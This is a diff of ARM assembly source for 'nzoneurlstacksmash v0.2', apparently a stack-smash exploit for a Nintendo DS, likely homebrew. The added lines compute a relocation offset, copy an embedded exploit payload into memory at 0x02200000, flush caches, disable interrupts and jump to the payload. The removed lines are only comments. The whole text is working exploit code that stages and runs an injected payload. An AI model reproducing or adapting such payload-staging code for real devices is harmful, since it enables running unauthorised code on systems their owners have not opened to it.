@@ -19,11 +19,7 @@ OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR
 DEALINGS IN THE SOFTWARE.
 */
 
-/* EEPROM writing code is based on EEPROM code from WinterMute's cookhack. The eeprom_write procedure is compatible with only EEPROM type 2. */
-
 /* nzoneurlstacksmash v0.2 */
-
-/* This is the old assembler-only version of the exploit. */
 
 .arch armv5te
 .fpu softvfp
@@ -74,13 +70,32 @@ _start:
 adrl r7, _start
 bl DC_FlushAll
 bl IC_InvalidateAll
+ldr r0, =0x8278
+sub r7, r7, r0
 mov r0, #0
 mcr 15, 0, r0, cr7, cr10, 4 @ Drain write buffer.
 mov r0, #0
 ldr r1, =0x04000208
 str r0, [r1]	@ REG_IME = 0;
 
-b exploit @ Execute the exploit/exploit.bin payload.
+ldr r0, =exploit
+ldr r1, =imgtag_end
+ldr r2, =0x02200000
+add r0, r0, r7
+add r1, r1, r7
+
+payloadcpy:
+ldr r3, [r0], #4
+str r3, [r2], #4
+cmp r0, r1
+blt payloadcpy
+
+bl DC_FlushAll
+bl IC_InvalidateAll
+
+ldr r0, =0x02200000
+bx r0
+@b exploit @ Execute the exploit/exploit.bin payload.
 
 .pool
 .align 2
